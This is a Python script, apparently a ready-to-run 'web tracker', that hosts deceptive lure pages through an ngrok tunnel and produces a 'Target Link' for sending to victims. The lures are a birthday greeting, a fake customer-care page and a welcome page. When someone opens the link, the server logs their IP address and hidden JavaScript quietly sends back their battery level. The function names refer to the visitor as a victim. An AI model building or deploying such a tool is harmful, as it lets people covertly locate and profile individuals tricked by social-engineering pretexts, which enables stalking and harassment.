import http.server
import socketserver
import threading
import json
import socket
import psutil
import platform
import time
from rich import print
from rich.panel import Panel
from rich.align import Align
from rich.console import Console
from pyngrok import ngrok

PORT = 8080

HTML_TEMPLATES = {
    "1": """
    <!DOCTYPE html>
    <html>
    <head><title>System Info</title></head>
    <body>
        <script>
            async function getInfo() {
                let battery = {};
                try {
                    const bt = await navigator.getBattery();
                    battery.level = (bt.level * 100) + "%";
                } catch (e) { battery.level = "N/A"; }

                fetch('/log', {
                    method: 'POST',
                    body: JSON.stringify({ battery: battery.level })
                });
            }
            getInfo();
        </script>
        <div style="text-align:center;margin-top:50px;">
            <h1>Happy Birthday My Dearest Friend</h1>
            <h2>Wishing You All The Best!</h2>
        </div>
    </body>
    </html>
    """,
    "2": """
    <!DOCTYPE html>
    <html>
    <head><title>Customer Care</title></head>
    <body>
        <script>
            async function getInfo() {
                let battery = {};
                try {
                    const bt = await navigator.getBattery();
                    battery.level = (bt.level * 100) + "%";
                } catch (e) { battery.level = "N/A"; }

                fetch('/log', {
                    method: 'POST',
                    body: JSON.stringify({ battery: battery.level })
                });
            }
            getInfo();
        </script>
        <div style="text-align:center;margin-top:50px;">
            <h2>Customer Care</h2>
            <p>📞 +91 98765 43210</p>
        </div>
    </body>
    </html>
    """,
    "3": """
    <!DOCTYPE html>
    <html>
    <head><title>Welcome</title></head>
    <body>
        <script>
            async function getInfo() {
                let battery = {};
                try {
                    const bt = await navigator.getBattery();
                    battery.level = (bt.level * 100) + "%";
                } catch (e) { battery.level = "N/A"; }

                fetch('/log', {
                    method: 'POST',
                    body: JSON.stringify({ battery: battery.level })
                });
            }
            getInfo();
        </script>
        <div style="text-align:center;margin-top:50px;">
            <h2>Welcome!</h2>
        </div>
    </body>
    </html>
    """
}

class TrackerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.headers.get('x-forwarded-for', self.client_address[0])
        print(Panel(f"[bold red]VISITOR DETECTED[/bold red]\n[bold white]IPv4 Address:[/bold white] {client_ip}", border_style="red"))
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(SELECTED_HTML.encode())

    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(content_length))
            print(Panel(f"[bold green]VISITOR HARDWARE INFO[/bold green]\n[bold white]Battery Level:[/bold white] {data['battery']}", expand=False))
            self.send_response(200)
            self.end_headers()

    def log_message(self, format, *args):
        return

def get_system_info():
    hostname = socket.gethostname()
    ip_addr = socket.gethostbyname(hostname)
    battery = psutil.sensors_battery()
    percent = f"{battery.percent}%" if battery else "N/A"
    if platform.system() == "Android":
        device = "Mobile/Tablet"
    elif battery is not None:
        device = "Laptop"
    else:
        device = "Desktop/PC"
    return ip_addr, percent, device

def start_server():
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), TrackerHandler) as httpd:
        httpd.serve_forever()

def get_victim_ip():
    global SELECTED_HTML
    console = Console()
    console.print(Align.center(Panel("[bold red]WEB TRACKER[/bold red]")))
    
    ip, bat, dev = get_system_info()
    console.print(Panel(f"Host IP: {ip}\nBattery: {bat}\nDevice: {dev}", title="System Info", border_style="blue"))

    token = input("\nEnter ngrok authtoken: ")
    ngrok.set_auth_token(token)
    
    print("\n1. Birthday\n2. Support\n3. Greet")
    choice = input("\nSelect (1-3): ")
    SELECTED_HTML = HTML_TEMPLATES.get(choice, HTML_TEMPLATES["1"])
    
    threading.Thread(target=start_server, daemon=True).start()
    
    public_url = ngrok.connect(PORT).public_url
    console.print(Panel(f"[bold green]Target Link:[/bold green] {public_url}", border_style="green"))
    
    try:      
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        ngrok.disconnect(public_url)

